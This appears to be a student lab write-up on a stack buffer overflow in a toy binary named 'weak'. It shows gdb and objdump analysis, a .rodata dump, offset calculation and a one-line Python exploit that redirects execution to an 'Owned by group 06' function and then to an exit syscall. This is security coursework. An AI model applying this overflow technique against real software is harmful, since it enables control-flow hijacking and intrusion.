1. The program reads from stdin and randomly capitalize the input string by subtracting 0x20 for each character. By running `echo "aaaaaaaa" | ./weak | od -A n -t x1`, we can see that some random 'a's (0x61) is output as 'A's (0x41). The program only outputs a maximum of 12 characters. If input is longer than 19 characters, the program gets a segmentation fault.
2. Since we know the buffer is set before calling scanf, we interrupt scanf in gdb to get memory address `0x805155d`. By looking at the objdump, we know entry point is `0x8051540`. Then we search for all instructions that jumps to this address and we can see some memory allocation before jumping. We input a long string to make the program segfault, and look at the location of the buffer overflow, which is near `0xffffd550`. Looking at the stack with and without buffer flowing, we can see that the buffer size is 12 bytes and we have to account for the saved registers, therefore, overflowing starts 20 bytes after start of buffer.
3. First, we look at the .rodata section of the program by running `objdump -s -j .rodata`. We can see that all of the "Owned by group XX" strings are stored in the front of .rodata.

        Contents of section .rodata:
        809f8a0 03000000 01000200 4f776e65 64206279  ........Owned by
        809f8b0 2067726f 75702030 310a004f 776e6564   group 01..Owned
        809f8c0 20627920 67726f75 70203032 0a004f77   by group 02..Ow
        809f8d0 6e656420 62792067 726f7570 2030330a  ned by group 03.
        809f8e0 004f776e 65642062 79206772 6f757020  .Owned by group 
        809f8f0 30340a00 4f776e65 64206279 2067726f  04..Owned by gro
        809f900 75702030 350a004f 776e6564 20627920  up 05..Owned by 
        809f910 67726f75 70203036 0a004f77 6e656420  group 06..Owned 
        809f920 62792067 726f7570 2030370a 004f776e  by group 07..Own
        809f930 65642062 79206772 6f757020 30380a00  ed by group 08..
        809f940 4f776e65 64206279 2067726f 75702030  Owned by group 0
        809f950 390a004f 776e6564 20627920 67726f75  9..Owned by grou
        809f960 70203130 0a004f77 6e656420 62792067  p 10..Owned by g
        809f970 726f7570 2031310a 004f776e 65642062  roup 11..Owned b
        809f980 79206772 6f757020 31320a00 4f776e65  y group 12..Owne
        809f990 64206279 2067726f 75702031 330a0025  d by group 13..%

    Then, we look at starting address of "Owned by group 06" which is `0x809f907`. In objdump, we search for the instruction that push this string into stack, which is `80482a5:	68 07 f9 09 08       	push   $0x809f907`. Now we know the starting address of our function is `0x0804829c`. Then, we buffer overflow the program to make it jump to `0x0804829c`. To make program terminate normally after calling that function, we have to buffer overflow is with a correct return address. Since exit is a syscall, we use gdb to catch the syscall and get the memory address to jump to. In gdb, we run `catch syscall 1 252` to call 'exit' and 'exit_group' syscall. Then, we just run the program without segfault so that it exits normally. From gdb, we get `Catchpoint 2 (call to syscall exit_group), 0x08051447 in ?? ()`. `0x08051447` is the address we want to jump to exit normally. 

4.  Our exploit source code:

        #!/bin/bash
        python -c 'print " "*20 + "\x9c\x82\x04\x08" + "\x47\x14\x05\x08"' | ./weak

5.  Our exploit is just piping `20 spaces + address of our function + address of exit syscall` into the program. We find the padding space by overflowing the buffer with a long string, then running `info registers` to look at the registers. $esp is pointing at `0xffffd550` on the stack and loads the content into $eip as the address of next instruction. This position on the stack is 20 bytes after the buffer which is why we overflow it with the address of our function. After running our desired function, the program seg faults because of invalid return address. We run `info registers` in gdb and see that $esp is pointing at `0xffffd554` on the stack and loads the content into $eip as return address. This address is right after our initial 24 bytes overflow, therefore we overflow it with the memory address of our exit to make the program terminate normally.